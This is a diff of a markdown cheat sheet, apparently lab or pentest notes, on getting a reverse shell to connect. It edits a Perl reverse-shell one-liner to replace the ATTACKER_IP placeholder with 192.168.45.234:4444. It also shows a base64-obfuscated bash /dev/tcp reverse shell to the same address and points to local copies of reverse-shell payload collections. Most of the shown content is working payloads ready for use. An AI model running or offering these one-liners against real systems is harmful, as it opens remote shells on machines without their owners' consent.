@@ -6,8 +6,6 @@
 
 ---
 
-When a reverse shell will not connect or will not go interactive: find binaries, test the path out, then try a different interpreter.
-
 ## Scan for tools
 
 ```bash
@@ -44,10 +42,11 @@ echo -n 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIzNC80NDQ0IDA+JjEK' | base64 
 ## Try perl/python?
 
 ```bash
-perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -e 'use Socket;$i="192.168.45.234";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
-## Resources
+## Refer to docs on more information on getting shell
 
-- [HackTricks — Linux reverse shells](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html) — more payloads when nc/bash fail
-- [InternalAllTheThings — reverse shell](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) — one-liners by language
+~/.hacklas/external/hacktricks/src/generic-hacking/reverse-shells/linux.md
+
+~/.hacklas/external/internal-all-the-things/docs/cheatsheets/shell-reverse-cheatsheet.md
